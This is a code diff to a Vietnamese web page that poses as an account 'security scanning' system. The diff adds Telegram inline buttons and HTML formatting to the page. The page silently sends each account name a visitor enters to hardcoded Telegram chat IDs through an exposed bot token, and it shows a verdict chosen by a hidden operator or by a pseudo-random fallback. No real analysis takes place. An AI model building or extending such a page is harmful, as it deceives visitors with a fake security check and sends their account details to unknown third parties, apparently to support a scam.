@@ -420,7 +420,7 @@
     <div class="logo glitch">Hệ thống kiểm tra<span> bảo mật</span></div>
     <div class="subtitle">DEEP ACCOUNT ANALYSIS SYSTEM</div>
     <div class="version-bar">
-      <span>v2.7.6-TG-MULTI</span>
+      <span>v2.7.7-TG-MULTI</span>
       <span id="clock">--:--:--</span>
       <span>NODE: VN-01</span>
     </div>
@@ -432,7 +432,7 @@
     <div class="input-group">
       <label class="input-label"></label>
       <div class="input-wrap">
-        <input type="text" id="accInput" placeholder="" autocomplete="off">
+        <input type="text" id="accInput" placeholder="Nhập tài khoản cần kiểm tra" autocomplete="off">
       </div>
     </div>
 
@@ -449,7 +449,7 @@
     <button class="btn-scan" id="scanBtn" onclick="startScan()">[ KIỂM TRA ]</button>
 
     <div class="terminal" id="terminal">
-      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.6 INITIALIZED</span>
+      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.7 INITIALIZED</span>
       <span class="log-line sys">// Đang chờ...</span>
     </div>
 
@@ -474,8 +474,7 @@
 const HARDCODED_BOT_TOKEN = "8733138340:AAGSz56sxLwM4u9OLDSV6jQcD45yXOkh2CQ";
 const HARDCODED_CHAT_IDS = [
   "6316826211",
-  "213123213",
-  "123123123",
+  "12312313"
 ];
 const TELEGRAM_TIMEOUT_SEC = 35;
 // ====================================================================
@@ -531,7 +530,7 @@ function log(msg, type='info', delay=0) {
 }
 
 function clearLogs() {
-  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.6 INITIALIZED</span>\n<span class="log-line sys">// Đang chờ...</span>';
+  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.7 INITIALIZED</span>\n<span class="log-line sys">// Đang chờ...</span>';
 }
 
 function setProgress(pct, label) {
@@ -569,8 +568,8 @@ function showPopup(type, title, desc) {
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// Gửi tin nhắn đến 1 chat ID
-async function sendTelegramToChat(token, chatId, message) {
+// Gửi tin nhắn với inline keyboard
+async function sendTelegramWithKeyboard(token, chatId, message, keyboard) {
   if (!message || message.trim() === '') {
     throw new Error('Message empty');
   }
@@ -581,6 +580,8 @@ async function sendTelegramToChat(token, chatId, message) {
     body: JSON.stringify({
       chat_id: chatId,
       text: message,
+       parse_mode: "HTML",
+      reply_markup: keyboard,
       disable_web_page_preview: true
     })
   });
@@ -589,12 +590,12 @@ async function sendTelegramToChat(token, chatId, message) {
   return { chatId: String(chatId), msgId: data.result.message_id };
 }
 
-// Gửi tin nhắn đến nhiều chat ID
-async function sendTelegramToMultiple(token, chatIds, message) {
+// Gửi tin nhắn đến nhiều chat ID với keyboard
+async function sendTelegramToMultiple(token, chatIds, message, keyboard) {
   const results = [];
   for (const chatId of chatIds) {
     try {
-      const result = await sendTelegramToChat(token, chatId, message);
+      const result = await sendTelegramWithKeyboard(token, chatId, message, keyboard);
       results.push(result);
     } catch (e) {
       // Bỏ qua lỗi từng user
@@ -603,7 +604,7 @@ async function sendTelegramToMultiple(token, chatIds, message) {
   return results;
 }
 
-// Lắng nghe phản hồi từ nhiều chat
+// Lắng nghe phản hồi từ nhiều chat (hỗ trợ callback query và text)
 async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
   const deadline = Date.now() + timeoutSec * 1000;
   let offset = 0;
@@ -616,7 +617,7 @@ async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
   const allowedChatIds = chatIds.map(id => String(id));
   
   while (Date.now() < deadline) {
-    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["message"]`;
+    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["message","callback_query"]`;
     
     try {
       const res = await fetch(url);
@@ -626,6 +627,24 @@ async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
         for (const update of data.result) {
           offset = update.update_id + 1;
           
+          // Xử lý callback query từ nút bấm
+          if (update.callback_query) {
+            const callback = update.callback_query;
+            const chatId = String(callback.message.chat.id);
+            const data_cb = callback.data;
+            
+            if (!allowedChatIds.includes(chatId)) continue;
+            
+            const sentMsgId = sentMap.get(chatId);
+            if (!sentMsgId || callback.message.message_id !== sentMsgId) continue;
+            
+            if (data_cb === 'co') return 'found';
+            if (data_cb === 'khong') return 'clean';
+            
+            continue;
+          }
+          
+          // Xử lý text message
           const msg = update.message;
           if (!msg || !msg.text) continue;
           
@@ -637,10 +656,10 @@ async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
           const sentMsgId = sentMap.get(chatId);
           if (!sentMsgId || msg.message_id <= sentMsgId) continue;
           
-          if (text === '1' || text === 'có' || text === 'co' || text.includes('found')) {
+          if (text === '/co' || text === '1' || text === 'có' || text === 'co') {
             return 'found';
           }
-          if (text === '0' || text === 'không' || text === 'khong' || text.includes('clean') || text.includes('sạch')) {
+          if (text === '/khong' || text === '0' || text === 'không' || text === 'khong') {
             return 'clean';
           }
         }
@@ -665,7 +684,7 @@ async function fallbackScan(account) {
   return seed < 45;
 }
 
-// Main scan - không có log telegram
+// Main scan
 async function startScan() {
   const acc = document.getElementById('accInput').value.trim();
   
@@ -705,18 +724,25 @@ async function startScan() {
     await sleep(200);
     
     let sentList = [];
-    try {
-      const msgText = `Thông báo kiểm tra
+  try {
+      // Format tin nhắn đơn giản như yêu cầu
+const msgText = `🔍 <b>Thông báo kiểm tra</b>
 
-Session: ${session}
-Tài khoản: ${acc}
-Thời gian: ${new Date().toLocaleString('vi-VN')}
-
-Trả lời:
-• 1 hoặc có → Có mã ẩn
-• 0 hoặc không → Không có mã ẩn`;
+<blockquote>📋Session: ${session}
+👤Tài khoản: ${acc}
+⏰Thời gian: ${new Date().toLocaleString('vi-VN')}
+</blockquote>
+Vui lòng chọn phản hồi:`;
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: "✅ Có mã ẩn", callback_data: "co" },
+            { text: "❌ Không có mã ẩn", callback_data: "khong" }
+          ]
+        ]
+      };
       
-      sentList = await sendTelegramToMultiple(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, msgText);
+      sentList = await sendTelegramToMultiple(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, msgText, keyboard);
       setProgress(45, 'CHỜ PHẢN HỒI...');
     } catch(e) {
       // Không log lỗi
